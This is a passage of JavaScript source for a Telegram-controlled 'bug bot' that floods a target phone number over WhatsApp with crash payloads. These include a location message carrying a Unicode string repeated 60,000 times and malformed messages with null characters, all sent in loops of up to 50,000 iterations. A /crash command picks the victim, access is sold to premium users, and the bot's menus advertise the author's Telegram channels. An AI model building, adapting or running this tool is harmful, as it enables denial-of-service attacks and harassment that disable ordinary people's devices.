                                                                   greetingMessageBody: "kontol",
                                                                   ctaPayload: "cta",
                                                                   disableNudge: true,
                                                                   originalImageUrl: "konstol"
                                                           },
                                                           featureEligibilities: {
                                                                   cannotBeReactedTo: true,
                                                                   cannotBeRanked: true,
                                                                   canRequestFeedback: true
                                                           },
                                                           forwardedNewsletterMessageInfo: {
                                                                   newsletterJid: "120363274419384848@newsletter",
                                                                   serverMessageId: 0,
                                                                   newsletterName: "ꦿꦸ".repeat(10),
                                                                   contentType: 3,
                                                                   accessibilityText: "kontol"
                                                           },
                                                           statusAttributionType: 2,
                                                           utm: {
                                                                   utmSource: "utm",
                                                                   utmCampaign: "utm2"
                                                           }
                                                   },
                                                   description: "\u0000"
                                           },
                                           messageContextInfo: {
                                                   messageSecret: crypto.randomBytes(32),
                                                   supportPayload: JSON.stringify({
                                                           version: 2,
                                                           is_ai_message: false,
                                                           should_show_system_message: false,
                                                           should_upload_client_logs: false,
                                                           ticket_id: crypto.randomBytes(16),
                                                   }),
                                           },
                                   }
                           }
                   }
                   await Ren.relayMessage(target, messagePayload, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By Motu patlu🐉");
           }
           async function IpLocation(target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await Ren.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "\u0000               " + IphoneCrash,
                                           url: "t.me/MOTU_PATALU_HINDU_HAI"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("Send Bug By MOTU PATLU 🐉");
                   } catch (error) {
                           console.error("ERROR SENDING IOSTRAVA:", error);
                   }
           }
           async function callxbutton(target) {
                   for (let i = 0; i < 500; i++) {
                           await CallPermision(target)
                           await CallPermision(target)
                   }
                   for (let i = 0; i < 50000; i++) {
                           await CrashButton(target)
                           await CrashButton(target)
                   }
           }
           async function crashuixcursor(target) {
                   for (let i = 0; i < 50000; i++) {
                           await DocumentUi(target)
                           await LocationUi(target)
                   }
                   for (let i = 0; i < 50000; i++) {
                           await CrashButton(target)
                           await CrashButton(target)
                   }
           }
           async function invisiphone(target) {
                   for (let i = 0; i < 100; i++) {
                           await IpLocation(target)
                           await IpLocation(target)
                   }
           }
           async function laghomeiphone(target) {
                   for (let i = 0; i < 1000; i++) {
                           await IpLocation(target)
                   }
                   for (let i = 0; i < 200; i++) {
                           await IpLocation(target)
                   }
           }
           bot.onText(/\/start(?:\s(.+))?/, async (msg, match) => {
                   const senderId = msg.from.id;
                   const chatId = msg.chat.id;
                   const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
                   let ligma = `
▢ 💀 ❤⃝𓆩 𝙹𝙰𝙸 𝚂𝙷𝚁𝙴𝙴 𝚁𝙰𝙼 👑 𓆪❤⃝ MOTU PATLU IS HER ANY PROBLEM DM ME @MOTU_PATALU_HINDU_HAI
BUG BOT V3.0. ❤⃝𓆩 𝙹𝙰𝙸 𝚂𝙷𝚁𝙴𝙴 𝚁𝙰𝙼 👑 𓆪❤⃝

▢ BUG BOT MOTU PATLU : JAVASCRIPT Telegram
▢ Type : Case-Plugins
▢ Status : Online HOSTING IN RAM 10GB STORAGE 100GB
▢ Time : ${greeting}
▢ Run Time : -`
                   const options = {
                           reply_markup: {
                                   inline_keyboard: [
                                           [{
                                                   text: "BUG MOTU PATLU 🐉",
                                                   callback_data: `xbug`
                                           }],
                                           [{
                                                   text: "MOTU PATLU 🕊️",
                                                   callback_data: `tqto`
                                           }, {
                                                   text: "💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫",
                                                   callback_data: `akses`
                                           }],
                                           [{
                                                   text: " 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈  🦠",
                                                   callback_data: `xbug`
                                           }],
                                           [{
                                                   text: "⟠「 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 」⟠",
                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                           }, {
                                                   text: "⟠「 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫 」⟠",
                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                           }],
                                           [{
                                                   text: "⟠「 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫 」⟠",
                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                           }]
                                   ]
                           }
                   };
                   bot.sendVideo(chatId, "https://files.catbox.moe/gpwejp.mp4", {
                           caption: ligma,
                           ...options,
                   });
           });
           const authorizedUsers = {};
           bot.onText(/\/crash(?:\s(.+))?/, async (msg, match) => {
                   const senderId = msg.from.id;
                   const chatId = msg.chat.id;
                   if (!whatsappStatus) {
                           return bot.sendMessage(chatId, "[ ! ] NOT CONNET FOR WHATSAPP 🦠");
                   }
                   if (!premiumUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] - ONLY PREMIUM USER");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] - EXAMPLE : /CRASH 91XXXX - [ BUG BY MOTU PATLU  ] 🦠");
                   }
                   const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
                   if (!/^\d+$/.test(numberTarget)) {
                           return bot.sendMessage(chatId, "[ ! ] - INPUT NUMBER TARGET 🦠");
                   }
                   const finalFormattedNumber = `${numberTarget}@s.whatsapp.net`;
                   const VirusName = {
                           "superior" : "𝐓𝐑𝐀𝐒𝐇 𝐅𝐋𝐎𝐀𝐓𝐈𝐍𝐆 𖥂",
                           "paytroll" : "𝐓𝐑𝐎𝐋𝐋 𝐒𝐔𝐏𝐄𝐑𝐈𝐎𝐑 𖥂",
                           "payment" : "𝐑𝐄𝐐 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𖥂",
                           "andro" : "𝐓𝐑𝐀𝐕𝐀𝐙𝐀𝐏 𖥂",
                           "iphonex" : "𝐂𝐀𝐋𝐋 𝐈𝐎𝐒 𖥂",
                           "traship" : "𝐃𝐎𝐗 𝐈𝐎𝐒 𖥂",
                           "crashui" : "𝐒𝐘𝐒𝐓𝐄𝐌 𝐔𝐈 𖥂",
                           "crashuitwo" : "𝐒𝐘𝐒𝐓𝐄𝐌 𝐓𝐑𝐀𝐒𝐇 𖥂",
                           "lagiphone" : "𝐙𝐀𝐏 𝐇𝐎𝐌𝐄 𖥂",
                           "xiphone" : "𝐙𝐀𝐏 𝐇𝐎𝐌𝐄𝐗 𖥂"
                           
                   }
                   authorizedUsers[chatId] = senderId;
                   const options = {
                           reply_markup: {
                                   inline_keyboard: [
                                           [{
                                                   text: "BUGANDROID",
                                                   callback_data: `superior:${finalFormattedNumber}`
                                           }, {
                                                   text: "MOTUBUG",
                                                   callback_data: `paytroll:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "INFNITYBUG",
                                                   callback_data: `payment:${finalFormattedNumber}`
                                           }, {
                                                   text: "ANDROIDNORMAL",
                                                   callback_data: `andro:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "FUCK YOU HEATER",
                                                   callback_data: `iphonex:${finalFormattedNumber}`
                                           }, {
                                                   text: "IPHONE X ",
                                                   callback_data: `traship:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "🪲 BUGMENU ",
                                                   callback_data: `crashui:${finalFormattedNumber}`
                                           }, {
                                                   text: "MOTU",
                                                   callback_data: `crashuitwo:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "HOME 𝐈͢𝐎ͯ𝐒",
                                                   callback_data: `lagiphone:${finalFormattedNumber}`
                                           }, {
                                                   text: "IOS",
                                                   callback_data: `xiphone:${finalFormattedNumber}`
                                           }],
                                           [{
                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                           }, {
                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                   url: "https://whatsapp.com/channel/0029Vap5Rs4CHDymSoiyg93M"
                                           }],
                                           [{
                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                   url: "https://t.me/xyrotestimoni"
                                           }]
                                   ]
                           }
                   };
                   bot.sendVideo(chatId, "https://files.catbox.moe/gpwejp.mp4", {
                           caption: "𓆫❦꯭𓆩 𝘔𝘖𝘛𝘜 𝘗𝘈𝘛𝘓𝘜 💜 𓆩꯭❦𓆫🐉",
                           ...options,
                   });
           });
           bot.onText(/\/pairing(?:\s(.+))?/, async (msg, match) => {
                   const senderId = msg.from.id;
                   const chatId = msg.chat.id;
                   if (!premiumUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] - ONLY OWNER 🐉")
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "EXAMPLE : /PAIRING 91XXX");
                   }
                   const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
                   if (!/^\d+$/.test(numberTarget)) {
                           return bot.sendMessage(chatId, "! INVALID - EXAMPLE : PAIRING 91XXX");
                   }
                   await getSessions(bot, chatId, numberTarget)
           });
           bot.on("callback_query", async (callbackQuery) => {
                   const chatId = callbackQuery.message.chat.id;
                   const senderId = callbackQuery.from.id;
                   const userId = callbackQuery.from.id;
                   const [action, finalFormattedNumber] = callbackQuery.data.split(':');
                   if (!premiumUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] - ONLY PREMIUM USER");
                   }
                   if (action !== "akses" && action !== "tqto" && action !== "xbug") {
                   const numberTarget = callbackQuery.data.match(/(\d+)/);
                   if (!numberTarget) {
                           return bot.sendMessage(chatId, "[ ! ] - INPUT NUMBER TARGET 🦠");
                   }
                   if (authorizedUsers[chatId] !== userId) {
                   return bot.answerCallbackQuery(callbackQuery.id, {
                           text: "🪲𓆫❦꯭𓆩 𝘔𝘖𝘛𝘜 𝘗𝘈𝘛𝘓𝘜 💜 𓆩꯭❦𓆫SEND BUG TARGET",
                           show_alert: true,
                        });
                   }
                   const finalFormattedNumber = `${numberTarget[1]}@s.whatsapp.net`;
                   }
                   try {
                           if (action === "superior") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/gpwejp.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "paytroll") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝐒𝐀𝐋𝐔𝐑𝐀𝐍 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝐓𝐄𝐒𝐓𝐈𝐌𝐎𝐍𝐈 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "payment") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 TG 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "andro") {
                                   await callxbutton(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "iphonex") {
                                   await invisiphone(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "traship") {
                                   await invisiphone(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/8tjnrw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "crashui") {
                                   await crashuixcursor(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/8tjnrw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "crashuitwo") {
                                   await crashuixcursor(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/8tjnrw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "lagiphone") {
                                   await laghomeiphone(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/8tjnrw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "xiphone") {
                                   await laghomeiphone(finalFormattedNumber);
                                   bot.sendVideo(chatId, "https://files.catbox.moe/8tjnrw.mp4", {
                                           caption: `<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒🐉\n\n▢ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${finalFormattedNumber}\n\n▢ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀𝗯𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 🎭`,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "tqto") {
                                   let ligma = `
╔─═「 𓆫❦꯭𓆩 𝘔𝘖𝘛𝘜 𝘗𝘈𝘛𝘓𝘜 💜 𓆩꯭❦𓆫  」
│┏─⊱
║▢ 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫
│▢ 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫
║▢ 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫
│▢ t.me/MOTU_PATALU_HINDU_HAI
║▢ SUPPORT ME AND I GIVE YOU FILE
│▢ MY GC LINK 🔗 🖇️ https://t.me/MRMOTUPATLUCHAT
║▢ JOIN MY GC AND FUCK YOUR ENEMY 
│▢ 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫
║▢ 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐
│▢ BUG 🪲 🐛 BOT V3.0-
║┗─⊱
╚─═─═─═─═─═─═─═⪩`;
                                   bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                           caption: ligma,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "akses") {
                                   let ligma = `
╔─═「 MOTU PATLU MENU 」
│┏─⊱
║▢ /pairing ‹number›
│▢ /addadmin ‹id›
║▢ /addprem ‹id›
║▢ /delladmin ‹id›
│▢ /dellprem ‹id›
║┗─⊱
╚─═─═─═─═─═─═─⪩`;
                                   bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                           caption: ligma,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else if (action === "xbug") {
                                   let ligma = `
<🪲 BUG BOT V3.0 🐉

╔─═「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 」
│┏─⊱
║▢ /crash ‹target›
│┗─⊱
╚─═─═─═─═─═─═⪩`;
                                   bot.sendVideo(chatId, "https://files.catbox.moe/8tjnrw.mp4", {
                                           caption: ligma,
                                           reply_markup: {
                                                   inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }]
                                                   ]
                                           }
                                   });
                           } else {
                                   if (!finalFormattedNumber) {
                                           return bot.sendMessage(chatId, "</> INVALID DATA CALL BACK");
                                   }
                                   bot.sendMessage(chatId, "[ ! ] - ACTION NOT FOUND");
                           }
                   } catch (err) {
                           bot.sendMessage(chatId, `[ ! ] - FAILED SEND BUG : ${err.message}`);
                   }
           });
           bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!premiumUsers.includes(senderId) && !adminUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] NOT ADD PREMIUM USER ANOMALI");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] EXAMPLE ADDPREM ID");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (!/^\d+$/.test(userId)) {
                           return bot.sendMessage(chatId, "[ ! ] SERTAKAN ID USER");
                   }
                   if (!premiumUsers.includes(userId)) {
                           premiumUsers.push(userId);
                           savePremiumUsers();
                           bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                   caption: `</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙙𝙙 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙐𝙨𝙚𝙧 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }],
                                                           [{
